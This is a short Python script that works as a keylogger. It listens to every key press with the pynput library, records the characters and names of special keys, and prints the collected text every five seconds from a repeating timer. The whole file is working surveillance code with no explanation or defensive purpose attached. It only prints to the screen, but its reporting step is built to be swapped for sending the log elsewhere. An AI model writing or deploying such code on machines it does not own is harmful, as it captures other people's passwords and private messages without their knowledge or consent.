import pynput.keyboard
import threading
log = ""
def process_key_press(key):
    global log

    try:
        log = log + str(key.char)

    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.delete:
            log = log + " delete "
        elif key == key.backspace:
            log = log + " delete "
        elif key == key.shift_r:
            log = log + " shift "
        elif key == key.shift:
            log = log + " shift "
        elif key == key.ctrl:
            log = log + " ctrl "

        elif key == key.enter:
            log = log + " enter "
        else:
            log = log + " " + str(key) + " "
    
def report():
    global log
    print(log)
    log = ""

    timer = threading.Timer(5, report)
    timer.start()
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)

with keyboard_listener:
    report()
    keyboard_listener.join()
